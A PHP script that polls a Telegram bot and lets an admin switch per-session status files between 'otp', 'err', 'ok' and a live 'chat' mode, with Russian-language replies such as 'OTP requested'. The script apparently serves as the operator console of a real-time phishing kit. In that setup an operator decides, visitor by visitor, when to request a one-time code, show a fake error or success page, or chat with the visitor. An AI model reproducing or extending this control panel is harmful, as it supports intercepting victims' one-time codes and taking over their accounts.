#!/usr/bin/env php
<?php
require_once __DIR__ . '/../config.php';

echo "🤖 Telegram Bot Polling Started\n";
echo "Bot Token: " . substr(BOT_TOKEN, 0, 10) . "...\n";
echo "Chat ID: " . CHAT_ID . "\n";
echo "Press Ctrl+C to stop\n\n";

$offset = 0;

while (true) {
    try {
        // Get updates
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/getUpdates?offset=" . $offset . "&timeout=30";
        $response = @file_get_contents($url);
        
        if (!$response) {
            echo "⚠️  Connection error, retrying...\n";
            sleep(5);
            continue;
        }
        
        $data = json_decode($response, true);
        
        if (!$data['ok']) {
            echo "❌ API Error: " . ($data['description'] ?? 'Unknown') . "\n";
            sleep(5);
            continue;
        }
        
        $updates = $data['result'];
        
        foreach ($updates as $update) {
            $offset = $update['update_id'] + 1;
            
            echo "📨 Update #" . $update['update_id'] . " received\n";
            
            // Log update
            $logFile = LOGS_DIR . 'bot_updates.log';
            file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . json_encode($update) . "\n", FILE_APPEND);
            
            // Process update
            processUpdate($update);
        }
        
    } catch (Exception $e) {
        echo "❌ Error: " . $e->getMessage() . "\n";
        sleep(5);
    }
}

function processUpdate($update) {
    // Handle callback queries (inline button clicks)
    if (isset($update['callback_query'])) {
        handleCallback($update['callback_query']);
        return;
    }
    
    // Handle text messages
    if (isset($update['message']['text'])) {
        handleMessage($update['message']);
        return;
    }
}

function handleCallback($callback) {
    $callbackData = $callback['data'];
    $callbackId = $callback['id'];
    
    echo "🔘 Callback: " . $callbackData . "\n";
    
    // Parse callback data
    $parts = explode('_', $callbackData);
    $action = $parts[0];
    $sessionId = $parts[1] ?? '';
    
    if (empty($sessionId)) {
        answerCallback($callbackId, '❌ Invalid session');
        return;
    }
    
    $statusFile = LOGS_DIR . $sessionId . '.status';
    
    if (!file_exists($statusFile)) {
        answerCallback($callbackId, '❌ Session not found');
        return;
    }
    
    // Update status based on action
    switch ($action) {
        case 'otp':
            file_put_contents($statusFile, 'otp');
            answerCallback($callbackId, '📱 OTP запрошен');
            echo "✅ Status changed to OTP for session: " . $sessionId . "\n";
            break;
            
        case 'err':
            file_put_contents($statusFile, 'err');
            answerCallback($callbackId, '❌ Ошибка отправлена');
            echo "✅ Status changed to ERROR for session: " . $sessionId . "\n";
            break;
            
        case 'ok':
            file_put_contents($statusFile, 'ok');
            answerCallback($callbackId, '✅ Успех отправлен');
            echo "✅ Status changed to SUCCESS for session: " . $sessionId . "\n";
            break;
            
        case 'chat':
            file_put_contents($statusFile, 'chat');
            answerCallback($callbackId, '💬 Чат активирован');
            
            // Send instruction message
            $chatMsg = "💬 <b>ЧАТ АКТИВИРОВАН</b>\n\n";
            $chatMsg .= "Теперь отправьте сообщение в формате:\n";
            $chatMsg .= "<code>" . $sessionId . " Ваше сообщение</code>\n\n";
            $chatMsg .= "Пример:\n";
            $chatMsg .= "<code>" . $sessionId . " Здравствуйте! Чем могу помочь?</code>";
            sendTelegramMessage($chatMsg, null);
            
            echo "✅ Chat activated for session: " . $sessionId . "\n";
            break;
    }
}

function handleMessage($message) {
    $text = $message['text'];
    
    // Skip commands
    if (strpos($text, '/') === 0) {
        return;
    }
    
    echo "💬 Message: " . substr($text, 0, 50) . "...\n";
    
    // Try to extract chat ID from message (simple 6-digit number)
    $chatSessionId = null;
    $adminMessage = null;
    
    // Check if message starts with 6-digit number
    if (preg_match('/^(\d{6})\s+(.+)/', $text, $matches)) {
        $chatSessionId = $matches[1];
        $adminMessage = $matches[2];
    }
    
    // Check if this is a reply to a message with chat ID
    if (!$chatSessionId && isset($message['reply_to_message']['text'])) {
        $replyText = $message['reply_to_message']['text'];
        if (preg_match('/#(\d{6})/', $replyText, $matches)) {
            $chatSessionId = $matches[1];
            $adminMessage = $text;
        }
    }
    
    if ($chatSessionId && $adminMessage) {
        $statusFile = LOGS_DIR . $chatSessionId . '.status';
        $chatFile = LOGS_DIR . $chatSessionId . '.chat';
        
        if (!file_exists($statusFile)) {
            sendTelegramMessage("❌ Сессия #" . $chatSessionId . " не найдена", null);
            echo "❌ Session not found: " . $chatSessionId . "\n";
            return;
        }
        
        $status = trim(file_get_contents($statusFile));
        
        if ($status !== 'chat') {
            sendTelegramMessage("❌ Чат не активирован для сессии #" . $chatSessionId . "\nТекущий статус: " . $status, null);
            echo "❌ Chat not active for session: " . $chatSessionId . " (status: " . $status . ")\n";
            return;
        }
        
        $cleanText = trim($adminMessage);
        
        if (!empty($cleanText)) {
            // Save admin message to chat file
            $chatData = [
                'from' => 'admin',
                'text' => $cleanText,
                'time' => time()
            ];
            file_put_contents($chatFile, json_encode($chatData) . "\n", FILE_APPEND);
            
            // Confirm message sent
            $confirmMsg = "✅ Сообщение отправлено\n\n";
            $confirmMsg .= "🆔 ID: <code>" . $chatSessionId . "</code>\n";
            $confirmMsg .= "💬 <i>" . htmlspecialchars($cleanText) . "</i>";
            sendTelegramMessage($confirmMsg, null);
            
            echo "✅ Message sent to session: " . $chatSessionId . "\n";
        }
    }
}

function answerCallback($callbackQueryId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery";
    
    $data = [
        'callback_query_id' => $callbackQueryId,
        'text' => $text
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'ignore_errors' => true
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}
